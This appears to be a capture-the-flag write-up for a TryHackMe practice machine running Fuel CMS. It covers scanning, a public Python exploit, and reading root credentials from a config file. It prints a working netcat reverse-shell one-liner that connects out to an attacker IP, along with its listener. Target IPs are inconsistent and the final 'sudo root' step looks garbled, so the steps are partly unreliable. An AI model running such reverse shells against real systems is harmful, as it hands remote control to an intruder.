## Version 2.0
## language: en

Feature:
  Site:
    TryHackMe
  Category:
    CTF
  User:
    GuzmanAndrew
  Goal:
    Escalate privileges to get two flags that are root and user.

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.2Oesr    |
    | Nmap            | 7.80        |
    | Python          | 2.7         |
    | Netcat          | 1.10        |
  Machine information:
    Given I am accessing the machine 10.8.6.159
    And is running on port 80

  Scenario: Information gathering
    Given that I run the following Nmap command
    """
    $ nmap -sV 10.10.169.195
    """
    Then I get the output
    """
    80/tcp open   http   Apache httpd 2.4.18 ((Ubuntu))
    """
    Then I can see that it has a port 80
    And is using server HTTP

  Scenario: Fail: Shell Reverse PHP
    Given I have a port 80
    When you enter that port there's a website
    Then I see that that website has the CMS configuration
    When I see that the web site has the admin's credentials
    Then entering I try to do a shell rever but it doesn't work

  Scenario: Fail: Nessus
    Given it didn't work to upload the reverse shell
    When I decide to see vulnerabilities in Nessus
    And there's nothing interesting about it

  Scenario: Success: file user.txt
    Given I know version of the CMS
    When I search the Internet for an exploit
    Then I find that there's a python exploit
    When I put the machine's IP in the code
    And I run the code and it works.
    Then I run some commands I see that it's very limited
    When I execute some commands to make a "shell"
    """
    $ rm /tmp/f ; mkfifo /tmp/f ; 
      cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.35.145 1337 >/tmp/f
    """
    And I use the Netcat to listen the "shell" of Python
    """
    $ nc -nlvp 1337
    """
    When I have the "shell" I decide to enter the user www-data
    Then inside that user I get the flag User

  Scenario: Success: file root.txt
    Given I have an access
    When I decide to look at all the directories
    And I found a file with the root credentials
    """
    $ fuel/application/config/database.conf
    """
    When I execute a command to enter as root
    """
    $ sudo root
    """
    Then I take out the Root flag
